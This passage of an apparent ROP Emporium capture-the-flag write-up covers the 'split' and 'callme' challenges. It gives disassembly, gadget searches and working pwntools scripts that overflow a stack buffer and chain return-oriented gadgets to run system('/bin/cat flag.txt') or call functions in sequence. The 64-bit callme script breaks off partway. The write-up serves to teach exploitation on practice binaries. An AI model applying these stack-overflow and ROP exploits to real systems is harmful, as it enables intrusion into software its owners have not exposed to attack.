/ <span class="o">(</span>fcn<span class="o">)</span> sym.pwnme 83
|   sym.pwnme <span class="o">()</span><span class="p">;</span>
|           <span class="p">;</span> var int local_28h @ ebp-0x28
|           <span class="p">;</span> CALL XREF from sym.main <span class="o">(</span>0x80485d4<span class="o">)</span>
|           0x080485f6      55             push ebp
|           0x080485f7      89e5           mov ebp, esp
|           0x080485f9      83ec28         sub esp, 0x28               <span class="p">;</span> <span class="s1">'('</span>
|           0x080485fc      83ec04         sub esp, 4
|           0x080485ff      6a20           push 0x20                   <span class="p">;</span> 32
|           0x08048601      6a00           push 0
|           0x08048603      8d45d8         lea eax, dword <span class="o">[</span>local_28h]
|           0x08048606      50             push eax
|           0x08048607      e854feffff     call sym.imp.memset         <span class="p">;</span> void <span class="k">*</span>memset<span class="o">(</span>void <span class="k">*</span>s, int c, size_t n<span class="o">)</span>
|           0x0804860c      83c410         add esp, 0x10
|           0x0804860f      83ec0c         sub esp, 0xc
|           0x08048612      6818870408     push str.Contriving_a_reason_to_ask_user_for_data... <span class="p">;</span> 0x8048718 <span class="p">;</span> <span class="s2">"Contriving a reason to ask user for data..."</span>
|           0x08048617      e804feffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
|           0x0804861c      83c410         add esp, 0x10
|           0x0804861f      83ec0c         sub esp, 0xc
|           0x08048622      6844870408     push 0x8048744
|           0x08048627      e8d4fdffff     call sym.imp.printf         <span class="p">;</span> int <span class="nb">printf</span><span class="o">(</span>const char <span class="k">*</span>format<span class="o">)</span>
|           0x0804862c      83c410         add esp, 0x10
|           0x0804862f      a180a00408     mov eax, dword <span class="o">[</span>obj.stdin__GLIBC_2.0] <span class="p">;</span> <span class="o">[</span>0x804a080:4]<span class="o">=</span>0
|           0x08048634      83ec04         sub esp, 4
|           0x08048637      50             push eax
|           0x08048638      6a60           push 0x60                   <span class="p">;</span> <span class="s1">'`'</span> <span class="p">;</span> 96
|           0x0804863a      8d45d8         lea eax, dword <span class="o">[</span>local_28h]
|           0x0804863d      50             push eax
|           0x0804863e      e8cdfdffff     call sym.imp.fgets          <span class="p">;</span> char <span class="k">*</span>fgets<span class="o">(</span>char <span class="k">*</span>s, int size, FILE <span class="k">*</span>stream<span class="o">)</span>
|           0x08048643      83c410         add esp, 0x10
|           0x08048646      90             nop
|           0x08048647      c9             leave
<span class="se">\ </span>          0x08048648      c3             ret
<span class="o">[</span>0x080485f6]&gt;
</code></pre></div></div>

<p>Instruction <code class="highlighter-rouge">0x08048607</code> creates a buffer of size 0x20 and stores it in <code class="highlighter-rouge">local_28h</code>. Instruction <code class="highlighter-rouge">0x0804863e</code> calls fgets and reads 0x60 characters into <code class="highlighter-rouge">local_28h</code>. There‚Äôs our overflow.</p>

<p>Let‚Äôs take a look at <code class="highlighter-rouge">usefulFunction()</code>.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>0x080485f6]&gt; s sym.usefulFunction
<span class="o">[</span>0x08048649]&gt; pdf
/ <span class="o">(</span>fcn<span class="o">)</span> sym.usefulFunction 25
|   sym.usefulFunction <span class="o">()</span><span class="p">;</span>
|           0x08048649      55             push ebp
|           0x0804864a      89e5           mov ebp, esp
|           0x0804864c      83ec08         sub esp, 8
|           0x0804864f      83ec0c         sub esp, 0xc
|           0x08048652      6847870408     push str.bin_ls             <span class="p">;</span> 0x8048747 <span class="p">;</span> <span class="s2">"/bin/ls"</span>
|           0x08048657      e8d4fdffff     call sym.imp.system         <span class="p">;</span> int system<span class="o">(</span>const char <span class="k">*</span>string<span class="o">)</span>
|           0x0804865c      83c410         add esp, 0x10
|           0x0804865f      90             nop
|           0x08048660      c9             leave
<span class="se">\ </span>          0x08048661      c3             ret
<span class="o">[</span>0x08048649]&gt;
</code></pre></div></div>

<p>This calls <code class="highlighter-rouge">system("/bin/ls")</code>, which is not what we want. We want <code class="highlighter-rouge">system("/bin/cat flag.txt")</code>. How do we change the argument that <code class="highlighter-rouge">system()</code> gets called with?</p>

<p>The way we get around this is to call <code class="highlighter-rouge">system()</code> ourselves. This is how we must set up the stack so we can call <code class="highlighter-rouge">system("/bin/cat flag.txt")</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>              &lt;Top of stack&gt;
|  {AAAAAAAAAAAAAAAA_buffer_overflow_str}  |
|  {overwritten_eip_with_addr_to_system}   |
|  {return_addr_of_system}                 |
|  {address_to_bin_cat_string}             |
</code></pre></div></div>

<p>I use rabin2 to find addresses of strings, and gdb to find the address of <code class="highlighter-rouge">system@plt</code>. For more information about how the Global Offset Table (GOT) and the Procedure Linkage Table (PLT) work, see <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">this</a>.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/ropemporium/split/32split# rabin2 <span class="nt">-z</span> split32
<span class="o">[</span>Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x000006f0 0x080486f0  21  22 <span class="o">(</span>.rodata<span class="o">)</span> ascii <span class="nb">split </span>by ROP Emporium
001 0x00000706 0x08048706   7   8 <span class="o">(</span>.rodata<span class="o">)</span> ascii 32bits<span class="se">\n</span>
002 0x0000070e 0x0804870e   8   9 <span class="o">(</span>.rodata<span class="o">)</span> ascii <span class="se">\n</span>Exiting
003 0x00000718 0x08048718  43  44 <span class="o">(</span>.rodata<span class="o">)</span> ascii Contriving a reason to ask user <span class="k">for </span>data...
004 0x00000747 0x08048747   7   8 <span class="o">(</span>.rodata<span class="o">)</span> ascii /bin/ls
000 0x00001030 0x0804a030  17  18 <span class="o">(</span>.data<span class="o">)</span> ascii /bin/cat flag.txt
root@kali:~/Documents/ropemporium/split/32split# gdb ./split32
GEF <span class="k">for </span>linux ready, <span class="nb">type</span> <span class="sb">`</span>gef<span class="s1">' to start, `gef config'</span> to configure
78 commands loaded <span class="k">for </span>GDB 8.2.1 using Python engine 3.7
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 2 commands could not be loaded, run <span class="sb">`</span>gef missing<span class="sb">`</span> to know why.
Reading symbols from ./split32...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
gef‚û§  print <span class="s1">'system@plt'</span>
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x8048430 &lt;system@plt&gt;
gef‚û§  
</code></pre></div></div>
<p><code class="highlighter-rouge">system@plt is at 0x8048430</code></p>

<p><code class="highlighter-rouge">"/bin/cat flag.txt" is at 0x0804a030</code></p>

<p>Using the same technique detailed in ret2win, I used gdb gef to find that the offset to overwrite EIP is 44 bytes.</p>

<p>Writing a simple exploit script with the given information.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python
</span>  <span class="mi">2</span>
  <span class="mi">3</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
  <span class="mi">4</span>
  <span class="mi">5</span> <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
  <span class="mi">6</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./split32"</span><span class="p">)</span>
  <span class="mi">7</span>
  <span class="mi">8</span> <span class="n">system_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048430</span><span class="p">)</span>
  <span class="mi">9</span> <span class="n">bin_cat_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804a030</span><span class="p">)</span>
 <span class="mi">10</span>
 <span class="mi">11</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">44</span>
 <span class="mi">12</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">system_addr</span>
 <span class="mi">13</span> <span class="n">payload</span> <span class="o">+=</span> <span class="s">"BBBB"</span>
 <span class="mi">14</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">bin_cat_addr</span>
 <span class="mi">15</span>
 <span class="mi">16</span> <span class="n">sh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
 <span class="mi">17</span>
 <span class="mi">18</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
 <span class="mi">19</span> <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="mi">20</span>
 <span class="mi">21</span> <span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
</code></pre></div></div>

<p>Running the script.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/split/32split# <span class="nb">chmod</span> +x exploit.py <span class="o">&amp;&amp;</span> ./exploit.py
ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
</code></pre></div></div>

<h3 id="64-bit-1">64-bit</h3>

<p>The 64-bit version is slightly more difficult because function arguments don‚Äôt get passed through the stack anymore.</p>

<p>When a function is called, the function‚Äôs arguments are passed in through 6 registers. The registers are (in order from the 1st to the 6th argument):</p>

<ol>
  <li>rdi</li>
  <li>rsi</li>
  <li>rdx</li>
  <li>rcx</li>
  <li>r8</li>
  <li>r9</li>
</ol>

<p>In this case, since we want to call <code class="highlighter-rouge">system()</code> with the address to the string ‚Äú/bin/cat flag.txt‚Äù, we have to first put this address into <code class="highlighter-rouge">rdi</code> before calling <code class="highlighter-rouge">system()</code>.</p>

<p>This is where a tool like ropper comes into play. What ropper does is it goes through a binary and finds all occurrences of these bits of assembly called ‚Äúgadgets‚Äù. An example of a gadget is <code class="highlighter-rouge">pop rdi; ret;</code>, which simply pops the top value off the stack into the RDI register, then returns out to the next value on the stack. This is known as a ‚Äúpop rdi gadget‚Äù. Another gadget might be a <code class="highlighter-rouge">pop rsi; pop r15; ret;</code> gadget, which you can return into out of a pop rdi gadget. This would allow you to control up to three arguments to a function!</p>

<p>A pop rdi gadget works well for us since <code class="highlighter-rouge">system()</code> only requires one argument.. We start out by using ropper to find a pop rdi gadget.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/ropemporium/split/64split# ropper <span class="nt">-f</span> ./split
<span class="o">[</span>INFO] Load gadgets <span class="k">for </span>section: PHDR
<span class="o">[</span>LOAD] loading... 100%
<span class="o">[</span>INFO] Load gadgets <span class="k">for </span>section: LOAD
<span class="o">[</span>LOAD] loading... 100%
<span class="o">[</span>LOAD] removing double gadgets... 100%



Gadgets
<span class="o">=======</span>

...
...
0x0000000000400883: pop rdi<span class="p">;</span> ret<span class="p">;</span>
...
...

91 gadgets found
root@kali:~/Documents/ropemporium/split/64split#
</code></pre></div></div>

<p><code class="highlighter-rouge">"pop rdi; ret;" at 0x0000000000400883</code></p>

<p>Now, this is what we need to do.</p>

<ol>
  <li>Overwrite RIP with the address to the pop rdi gadget.</li>
  <li>The next 8 bytes must be the address to the string ‚Äú/bin/cat flag.txt‚Äù, which will get stored into RDI using the <code class="highlighter-rouge">pop rdi;</code> statement.</li>
  <li>The next 8 bytes must be the address to <code class="highlighter-rouge">system()</code>, which the <code class="highlighter-rouge">ret;</code> statement will return into.</li>
</ol>

<p>We don‚Äôt have to provide a return address for <code class="highlighter-rouge">system()</code> in this case because we aren‚Äôt passing arguments through the stack.</p>

<p>Let‚Äôs not forget to quickly grab the addresses for <code class="highlighter-rouge">system@plt</code> and the string ‚Äú/bin/cat flag.txt‚Äù.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/ropemporium/split/64split# rabin2 <span class="nt">-z</span> ./split
<span class="o">[</span>Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x000008a8 0x004008a8  21  22 <span class="o">(</span>.rodata<span class="o">)</span> ascii <span class="nb">split </span>by ROP Emporium
001 0x000008be 0x004008be   7   8 <span class="o">(</span>.rodata<span class="o">)</span> ascii 64bits<span class="se">\n</span>
002 0x000008c6 0x004008c6   8   9 <span class="o">(</span>.rodata<span class="o">)</span> ascii <span class="se">\n</span>Exiting
003 0x000008d0 0x004008d0  43  44 <span class="o">(</span>.rodata<span class="o">)</span> ascii Contriving a reason to ask user <span class="k">for </span>data...
004 0x000008ff 0x004008ff   7   8 <span class="o">(</span>.rodata<span class="o">)</span> ascii /bin/ls
000 0x00001060 0x00601060  17  18 <span class="o">(</span>.data<span class="o">)</span> ascii /bin/cat flag.txt
root@kali:~/Documents/ropemporium/split/64split# gdb ./split
GEF <span class="k">for </span>linux ready, <span class="nb">type</span> <span class="sb">`</span>gef<span class="s1">' to start, `gef config'</span> to configure
78 commands loaded <span class="k">for </span>GDB 8.2.1 using Python engine 3.7
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 2 commands could not be loaded, run <span class="sb">`</span>gef missing<span class="sb">`</span> to know why.
Reading symbols from ./split...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
gef‚û§  print <span class="s1">'system@plt'</span>
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x4005e0 &lt;system@plt&gt;
gef‚û§  
</code></pre></div></div>

<p>Using the same technique detailed in ret2win, I used gdb gef to find that the offset to overwrite RIP is 40 bytes.</p>

<p>Writing an exploit script.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python
</span>  <span class="mi">2</span>
  <span class="mi">3</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
  <span class="mi">4</span>
  <span class="mi">5</span> <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
  <span class="mi">6</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./split"</span><span class="p">)</span>
  <span class="mi">7</span>
  <span class="mi">8</span> <span class="n">system_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4005e0</span><span class="p">)</span>
  <span class="mi">9</span> <span class="n">bin_cat_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00601060</span><span class="p">)</span>
 <span class="mi">10</span> <span class="n">pop_rdi_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400883</span><span class="p">)</span>
 <span class="mi">11</span>
 <span class="mi">12</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">40</span>
 <span class="mi">13</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_addr</span>
 <span class="mi">14</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">bin_cat_addr</span>
 <span class="mi">15</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">system_addr</span>
 <span class="mi">16</span>
 <span class="mi">17</span> <span class="n">sh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
 <span class="mi">18</span>
 <span class="mi">19</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
 <span class="mi">20</span> <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="mi">21</span>
 <span class="mi">22</span> <span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
</code></pre></div></div>

<p>Running the exploit.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/split/64split# <span class="nb">chmod</span> +x exploit.py <span class="o">&amp;&amp;</span> ./exploit.py
ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
</code></pre></div></div>

<h1 id="callme">callme</h1>

<p>For this challenge, the description tells us we have to call <code class="highlighter-rouge">callme_one(1, 2, 3)</code>, <code class="highlighter-rouge">callme_two(1, 2, 3)</code> and <code class="highlighter-rouge">callme_three(1, 2, 3)</code>, in that order, to get the flag.</p>

<h3 id="32-bit-2">32-bit</h3>

<p>Running checksec.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/callme/32callme# checksec callme32
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/ropemporium/callme/32callme/callme32'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
    RPATH:    <span class="s1">'./'</span>

</code></pre></div></div>

<p>Let‚Äôs see what its doing.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/callme/32callme# r2 callme32
<span class="o">[</span>0x08048640]&gt; aaaa
<span class="o">[</span>x] Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
<span class="o">[</span>x] Analyze <span class="k">function </span>calls <span class="o">(</span>aac<span class="o">)</span>
<span class="o">[</span>x] Analyze len bytes of instructions <span class="k">for </span>references <span class="o">(</span>aar<span class="o">)</span>
<span class="o">[</span>x] Constructing a <span class="k">function </span>name <span class="k">for </span>fcn.<span class="k">*</span> and sym.func.<span class="k">*</span> functions <span class="o">(</span>aan<span class="o">)</span>
<span class="o">[</span>x] Enable constraint types analysis <span class="k">for </span>variables
<span class="o">[</span>0x08048640]&gt; afl
...
0x080485b0    1 6            sym.imp.callme_three
0x080485c0    1 6            sym.imp.callme_one
...
0x08048620    1 6            sym.imp.callme_two
...
0x0804873b    1 123          sym.main
0x080487b6    1 86           sym.pwnme
0x0804880c    1 67           sym.usefulFunction
...
<span class="o">[</span>0x08048640]&gt; s sym.pwnme
<span class="o">[</span>0x080487b6]&gt; pdf
/ <span class="o">(</span>fcn<span class="o">)</span> sym.pwnme 86
|   sym.pwnme <span class="o">()</span><span class="p">;</span>
|           <span class="p">;</span> var int local_28h @ ebp-0x28
|           <span class="p">;</span> CALL XREF from sym.main <span class="o">(</span>0x8048794<span class="o">)</span>
|           0x080487b6      55             push ebp
|           0x080487b7      89e5           mov ebp, esp
|           0x080487b9      83ec28         sub esp, 0x28               <span class="p">;</span> <span class="s1">'('</span>
|           0x080487bc      83ec04         sub esp, 4
|           0x080487bf      6a20           push 0x20                   <span class="p">;</span> 32
|           0x080487c1      6a00           push 0
|           0x080487c3      8d45d8         lea eax, dword <span class="o">[</span>local_28h]
|           0x080487c6      50             push eax
|           0x080487c7      e844feffff     call sym.imp.memset         <span class="p">;</span> void <span class="k">*</span>memset<span class="o">(</span>void <span class="k">*</span>s, int c, size_t n<span class="o">)</span>
|           0x080487cc      83c410         add esp, 0x10
|           0x080487cf      83ec0c         sub esp, 0xc
|           0x080487d2      68f8880408     push str.Hope_you_read_the_instructions... <span class="p">;</span> 0x80488f8 <span class="p">;</span> <span class="s2">"Hope you read the instructions..."</span>
|           0x080487d7      e8f4fdffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
|           0x080487dc      83c410         add esp, 0x10
|           0x080487df      83ec0c         sub esp, 0xc
|           0x080487e2      681a890408     push 0x804891a
|           0x080487e7      e8a4fdffff     call sym.imp.printf         <span class="p">;</span> int <span class="nb">printf</span><span class="o">(</span>const char <span class="k">*</span>format<span class="o">)</span>
|           0x080487ec      83c410         add esp, 0x10
|           0x080487ef      a160a00408     mov eax, dword <span class="o">[</span>obj.stdin__GLIBC_2.0] <span class="p">;</span> <span class="o">[</span>0x804a060:4]<span class="o">=</span>0
|           0x080487f4      83ec04         sub esp, 4
|           0x080487f7      50             push eax
|           0x080487f8      6800010000     push 0x100                  <span class="p">;</span> 256
|           0x080487fd      8d45d8         lea eax, dword <span class="o">[</span>local_28h]
|           0x08048800      50             push eax
|           0x08048801      e89afdffff     call sym.imp.fgets          <span class="p">;</span> char <span class="k">*</span>fgets<span class="o">(</span>char <span class="k">*</span>s, int size, FILE <span class="k">*</span>stream<span class="o">)</span>
|           0x08048806      83c410         add esp, 0x10
|           0x08048809      90             nop
|           0x0804880a      c9             leave
<span class="se">\ </span>          0x0804880b      c3             ret
<span class="o">[</span>0x080487b6]&gt;
</code></pre></div></div>

<p>We see the three <code class="highlighter-rouge">callme()</code> functions that we have to call in order. <code class="highlighter-rouge">pwnme()</code> still has the same old buffer overflow vulnerability. This time though, we have to jump to three functions one after another, <strong><em>and</em></strong> call them with the correct arguments.</p>

<p>The way to do that is by initially setting up the stack so we call <code class="highlighter-rouge">callme_one()</code> with the arguments <code class="highlighter-rouge">(1, 2, 3)</code>, then we need to return into a gadget that will pop those three arguments off of the stack. The gadget will then return into <code class="highlighter-rouge">callme_two()</code> and proceed to do the same thing. I think it‚Äôs easier to just do it rather than try to explain it.</p>

<p>First, we need the addresses to the three functions.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/callme/32callme# rabin2 <span class="nt">-i</span> callme32
<span class="o">[</span>Imports]
Num  Vaddr       Bind      Type Name
...
   4 0x080485b0  GLOBAL    FUNC callme_three
   5 0x080485c0  GLOBAL    FUNC callme_one
...
  12 0x08048620  GLOBAL    FUNC callme_two
...
</code></pre></div></div>

<p>Then we need a gadget that pops three values off of the stack before returning.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/callme/32callme# ropper <span class="nt">-f</span> callme32                                                                                                                                            root@kali
<span class="o">[</span>INFO] Load gadgets from cache
<span class="o">[</span>LOAD] loading... 100%
<span class="o">[</span>LOAD] removing double gadgets... 100%



Gadgets
<span class="o">=======</span>


...
0x080488a9: pop esi<span class="p">;</span> pop edi<span class="p">;</span> pop ebp<span class="p">;</span> ret<span class="p">;</span>
...

101 gadgets found
</code></pre></div></div>

<p>Now, we just have to do the exploit step by step.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python
</span>  <span class="mi">2</span>
  <span class="mi">3</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
  <span class="mi">4</span>
  <span class="mi">5</span> <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
  <span class="mi">6</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./callme32"</span><span class="p">)</span>
  <span class="mi">7</span>
  <span class="mi">8</span> <span class="n">callme_one_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080485c0</span><span class="p">)</span>
  <span class="mi">9</span> <span class="n">callme_two_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048620</span><span class="p">)</span>
 <span class="mi">10</span> <span class="n">callme_three_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080485b0</span><span class="p">)</span>
 <span class="mi">11</span> <span class="n">pop_three_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080488a9</span><span class="p">)</span>
 <span class="mi">12</span>
 <span class="mi">13</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">44</span> <span class="c1"># First overflow the buffer until EIP
</span> <span class="mi">14</span>
 <span class="mi">15</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">callme_one_addr</span> <span class="c1"># Jump to callme_one()
</span> <span class="mi">16</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_three_addr</span> <span class="c1"># callme_one() returns to the gadget, the gadget pops 1,2,3 off the stack
</span> <span class="mi">17</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># Argument 1 for callme_one()
</span> <span class="mi">18</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="c1"># Argument 2 for callme_one()
</span> <span class="mi">19</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span> <span class="c1"># Argument 3 for callme_one()
</span> <span class="mi">20</span>
 <span class="mi">21</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">callme_two_addr</span> <span class="c1"># The gadget pops the 1,2,3 then returns into callme_two() and the cycle continues..
</span> <span class="mi">22</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_three_addr</span>
 <span class="mi">23</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
 <span class="mi">24</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
 <span class="mi">25</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span>
 <span class="mi">26</span>
 <span class="mi">27</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">callme_three_addr</span>
 <span class="mi">28</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="c1"># Return address doesn't matter at this point
</span> <span class="mi">29</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
 <span class="mi">30</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span>
 <span class="mi">31</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span>
 <span class="mi">32</span>
 <span class="mi">33</span> <span class="n">sh</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
 <span class="mi">34</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
 <span class="mi">35</span> <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="mi">36</span>
 <span class="mi">37</span> <span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
</code></pre></div></div>

<p>Running the exploit.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Documents/ropemporium/callme/32callme# <span class="nb">chmod</span> +x exploit.py <span class="o">&amp;&amp;</span> ./exploit.py
ROPE<span class="o">{</span>a_placeholder_32byte_flag!<span class="o">}</span>
</code></pre></div></div>

<h3 id="64-bit-2">64-bit</h3>

<p>The 64-bit version is the same, except now instead of popping three values off the stack everytime, we just have to pop those three values into the three registers RDI (first argument), RSI (second argument), and RDX (third argument), in that order. The functions will use the values in those registers as their arguments. I will skip everything except the exploit script since I‚Äôve already explained how to find the addresses required for the functions and the gadget.</p>

<p>The exploit script.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python
</span>  <span class="mi">2</span>
  <span class="mi">3</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
  <span class="mi">4</span>
  <span class="mi">5</span> <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
  <span class="mi">6</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./callme"</span><span class="p">)</span>
  <span class="mi">7</span>
  <span class="mi">8</span> <span class="n">callme_one_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401850</span><span class="p">)</span>
  <span class="mi">9</span> <span class="n">callme_two_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401870</span><span class="p">)</span>
 <span class="mi">10</span> <span class="n">callme_three_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401810</span><span class="p">)</span>
 <span class="mi">11</span> <span class="n">pop_three_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401ab0</span><span class="p">)</span> <span class="c1"># pop rdi; pop rsi; pop rdx; ret;
</span> <span class="mi">12</span>
 <span class="mi">13</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">40</span> <span class="c1"># Overflow the buffer
</span> <span class="mi">14</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_three_addr</span> <span class="c1"># Jump to the gadget. Each pop instruction will load the following 3 values
</span> <span class="mi">15</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># Load 1 into rdi
</span> <span class="mi">16</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="c1"># Load 2 into rsi
